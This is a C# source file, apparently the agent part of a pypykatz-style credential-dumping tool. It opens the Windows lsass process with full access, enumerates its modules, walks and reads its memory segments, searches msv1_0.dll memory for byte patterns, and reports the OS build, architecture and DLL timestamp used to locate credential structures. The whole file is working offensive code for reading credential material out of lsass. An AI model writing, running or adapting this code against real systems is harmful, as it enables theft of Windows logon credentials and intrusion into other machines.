using System;
using Microsoft.Win32;
using System.IO;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.ComponentModel;


namespace pypyagent
{

    class PYPYreader
    {
        const int PROCESS_ALL_ACCESS = 0x1F0FFF;

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);

        [StructLayout(LayoutKind.Sequential)]
        public struct MEMORY_BASIC_INFORMATION
        {
            public IntPtr BaseAddress;
            public IntPtr AllocationBase;
            public uint AllocationProtect;
            public IntPtr RegionSize;
            public uint State;
            public uint Protect;
            public uint Type;
        }

        public class SegmentInfo
        {
            public ulong BaseAddress;
            public ulong AllocationBase;
            public ulong RegionSize;
            public int State;
            public int Protect;
            public int Type;

        }



        IntPtr pHandle;
        ProcessModuleCollection modules;
        Dictionary<ProcessModule, List<SegmentInfo>> module_segments = new Dictionary<ProcessModule, List<SegmentInfo>>();

        public void open_lsass()
        {
            Process process = Process.GetProcessesByName("lsass")[0];
            this.pHandle = OpenProcess(PROCESS_ALL_ACCESS, false, process.Id);

            modules = process.Modules;


        }

        public byte[] read(ulong pos, ulong length)
        {
            IntPtr bytesRead;
            byte[] buffer = new byte[length];
            ReadProcessMemory(this.pHandle, (IntPtr)pos, buffer, buffer.Length, out bytesRead);

            return buffer;

        }

        static public string GetLastError()
        {
            return new Win32Exception(Marshal.GetLastWin32Error()).Message;
        }

        static public int get_buildnumber()
        {
            int buildnumber = 0;
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\"))
                if (key != null)
                {
                    Object o = key.GetValue("CurrentBuildNumber");
                    if (o != null)
                    {
                        buildnumber = int.Parse((string)o);
                    }
                }
            return buildnumber;
        }

        static public int get_arch()
        {
            //if (Environment.Is64BitOperatingSystem)
            if(utils.Is64BitOperatingSystem())
                return 9;
            return 0;
        }

        public ulong get_msvdll_timestamp()
        {
            ProcessModule module = get_module_info("msv1_0.dll");
            FileInfo info = new System.IO.FileInfo(module.FileName);
            return (ulong)utils.GetTimeTSecondsFrom(info.CreationTimeUtc.Ticks);
        }


        public string get_info()
        {
            this.open_lsass();
            int buildnumber = PYPYreader.get_buildnumber();
            int arch = PYPYreader.get_arch();
            ulong msvdll_ts = get_msvdll_timestamp();

            //avoiding importing extra libs for json...
            string res = "{ \"arch\" : " + arch.ToString() + ", \"buildno\": " + buildnumber.ToString() + ", \"msvdllts\": " + msvdll_ts.ToString() + " }";
            return res;
        }

        public ProcessModule get_module_info(string module_name)
        {
            //finding module
            foreach (ProcessModule module in this.modules)
            {
                if (module.ModuleName.ToLower().IndexOf(module_name.ToLower()) != -1)
                {
                    return module;
                }
            }
            throw new Exception("Module not found!");
        }

        public List<SegmentInfo> get_segment_info(string module_name)
        {
            ProcessModule module;
            try
            {
                module = get_module_info(module_name);
            }
            catch(Exception)
            {
                return null;
            }
            if (module_segments.ContainsKey(module))
                return module_segments[module];

            ulong currentAddress = (ulong)module.BaseAddress;
            ulong maxAddress = currentAddress + (ulong)module.ModuleMemorySize;

            
            List<SegmentInfo> segment_info = new List<SegmentInfo>();

            while ((ulong)currentAddress < (ulong)maxAddress)
            {
                SegmentInfo si = new SegmentInfo();
                MEMORY_BASIC_INFORMATION MI;
                int result = VirtualQueryEx(this.pHandle, (IntPtr)currentAddress, out MI, (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION)));
                if (result == 0)
                    throw new Exception("VirtualQueryEx returned error! " + GetLastError());

                si.BaseAddress = (ulong)MI.BaseAddress;
                si.AllocationBase = (ulong)MI.AllocationBase;
                si.RegionSize = (ulong)MI.RegionSize;
                si.State = (int)MI.State;
                si.Protect = (int)MI.Protect;
                si.Type = (int)MI.Type;
                segment_info.Add(si);
                currentAddress = (ulong)MI.BaseAddress + (ulong)MI.RegionSize;
            }

            module_segments[module] = segment_info;

            return segment_info;

        }

        public ulong find(string module_name, byte[] pattern)
        {
            List<SegmentInfo> segments = get_segment_info(module_name);
            if(segments == null)
            {
                return 0;
            }
            foreach (SegmentInfo segment in segments)
            {
                byte[] segment_memory = this.read((ulong)segment.BaseAddress, (ulong)segment.RegionSize);
                int res = search_segment(segment_memory, pattern);
                if (res != -1)
                {
                    return (ulong)segment.BaseAddress + (ulong)res;
                }

            }
            return 0;


        }

        public static int search_segment(byte[] arrayToSearchThrough, byte[] patternToFind)
        {
            if (patternToFind.Length > arrayToSearchThrough.Length)
                return -1;
            for (int i = 0; i < arrayToSearchThrough.Length - patternToFind.Length; i++)
            {
                bool found = true;
                for (int j = 0; j < patternToFind.Length; j++)
                {
                    if (arrayToSearchThrough[i + j] != patternToFind[j])
                    {
                        found = false;
                        break;
                    }
                }
                if (found)
                {
                    return i;
                }
            }
            return -1;
        }
    }
}
